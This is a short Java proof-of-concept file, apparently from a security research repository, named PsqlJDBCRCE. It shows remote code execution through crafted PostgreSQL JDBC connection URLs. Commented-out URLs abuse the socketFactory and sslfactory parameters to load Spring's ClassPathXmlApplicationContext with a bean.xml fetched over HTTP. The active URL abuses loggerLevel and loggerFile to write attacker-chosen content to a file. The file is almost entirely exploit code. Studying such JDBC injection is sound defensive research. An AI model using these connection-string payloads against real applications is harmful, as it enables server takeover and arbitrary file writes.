package com.javasec.jdbc.postgres;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;


public class PsqlJDBCRCE {
    public static void main(String[] args) throws SQLException {
        String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = "http://127.0.0.1:8000/bean.xml";
        String loggerLevel = "debug";
        String loggerFile = "test.txt";
        String shellContent="test";
        //String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test/?socketFactory="+socketFactoryClass+ "&socketFactoryArg="+socketFactoryArg;
        //String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test/?sslfactory="+socketFactoryClass+ "&sslfactoryarg="+socketFactoryArg;
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test?loggerLevel="+loggerLevel+"&loggerFile="+loggerFile+ "&"+shellContent;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
